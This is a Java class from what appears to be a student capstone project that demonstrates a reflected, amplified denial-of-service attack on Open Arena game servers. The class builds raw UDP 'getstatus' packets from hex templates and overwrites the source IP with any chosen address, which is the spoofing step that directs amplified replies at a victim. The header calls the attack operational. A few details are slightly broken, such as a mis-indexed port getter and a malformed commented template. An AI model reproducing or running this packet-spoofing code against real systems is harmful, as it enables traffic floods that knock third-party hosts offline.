/** 
 * Class: CMSC495 Spring 2014
 * Assignment: Capstone, Week 6, Sprint 1
 * 
 * Team Members: Brad Norman, Jamie Lane, Daniel Ross
 * 
 * Date: 26 April 2014 
 * 
 * File:	RdosTester.java (main application) 	
 * 			->Packet.java<-
 * 			PacketTransmitter.java
 * 			Analysis.java
 * 			
 * 			Demonstrate a reflected and amplified Denial-of-Service attack mechanism
 * 			exploiting a vulnerability in Open Arena server versions <= 0.8.5
 * 
 * Current Status: Operational as described
 * 
 * @author Daniel Ross
 *           
 **/

package teamC;

// models an IP packet
public class RdosPacket {
	
	// source address
	private String srcIp;
	
	// destination address
	private String dstIp;
	
	// destination port
	private String dstPort;
	
	// base getStatus request packet, includes IPv4 header, UDP header, UDP data
	// private String packetBase = "ffffffffffff001fbc01b4db0800450000293cbd400080118c93c0a8580ac0a858186d386d380015319affffffff676574737461747573";
	// private String packetBase = "ffffffffffff001fbc01b4db08004500002b60a100008011c166c0a85812ffffffff6d386d3b001762c3ffffffff676574696e666f20787878000000";
	// private String packetBase = "d4ca6dccdd5174d02b35a3c408004500002b113a0000801171efc0a85816860018da6d386d3a0017c3e5ffffffff676574696e666f20787878";
	
	// getInfo
	// private String packetBase = "d40xca6dccdd5174d02b0x35a3c408004500000x2b4d4c000080113d0x0fc0a858160565920x436d386d380017cb0x19ffffffff6765740x696e666f20787878"; 
	
	// getStatus
	private String packetBase = "d4ca6dccdd5174d02b35a3c408004500002950a10000801139bcc0a85816056592436d386d3800153d3cffffffff676574737461747573";
	
	// complete IP packet
	private String completePacket;
	
	// size of packet in bytes
	private int packetSize;	
	
	// constructor requiring complete packet as String representing hex
	// useful for received packets
	public RdosPacket(String completePacket)
	{
		this.completePacket = completePacket;
		packetSizeCalc();
	
	}	// end Packet constructor

	// constructor requiring source and destination address and port info
	// useful for creating packets to transmit, requires checksums to be updated before transmission
	public RdosPacket(int srcIP1, int srcIP2, int srcIP3, int srcIP4, int dstIP1, int dstIP2, int dstIP3, int dstIP4, int port)
	{
		// convert source address to hex, add leading zeroes if necessary, concatenate
		this.srcIp = formatOctet(srcIP1) + formatOctet(srcIP2) + formatOctet(srcIP3) + formatOctet(srcIP4);
		
		// convert destination address to hex, add leading zeroes if necessary, concatenate
		this.dstIp = formatOctet(dstIP1) + formatOctet(dstIP2) + formatOctet(dstIP3) + formatOctet(dstIP4);
		
		// convert destination port to hex, add leading zeroes if necessary
		this.dstPort = formatPort(port);
		
		// overwrite packetBase IP and UDP header fields with user specified info
		packetRewrite();
		
		// calculate packet size in bytes
		packetSizeCalc();
		
	}  // end Packet constructor
	
	// calculate packet size in bytes, subtracts byte-count for ethernet header
	private void packetSizeCalc() {
		
		packetSize = (completePacket.length() / 2) - 14;
		
	}  // end method packetSizeCalc	
	
	// converts integer representation of IP address octets into a hex string, with leading zeroes
	private String formatOctet(int octet)
	{
		return Integer.toHexString(0x100 | octet).substring(1);
	
	}  // end method formatOctet
	
	// converts integer representation of network port into a hex string, with leading zeroes
	private String formatPort(int port)
	{
		return Integer.toHexString(0x10000 | port).substring(1);
	
	} // end method formatPort
	
	// overwrite packetBase IP and UDP header fields with user specified info
	private void packetRewrite()
	{
		completePacket = packetBase.substring(0,52) + srcIp + dstIp + packetBase.substring(68,72) + dstPort + packetBase.substring(76,packetBase.length());
		
	} // end method packetRewrite
	
	// return packet size
	public int getPacketSize() {
		
		return packetSize;
	
	} // end method getPacketSize
	
	// return packet size
	public String getPort() {
		
		return completePacket.substring(73,76);
	
	} // end method getPacketSize
	
	// returns completePacket as string representation of packet object 	
	public String toString()
	{
		return completePacket;
	
	}  // end method toString

} // end class Packet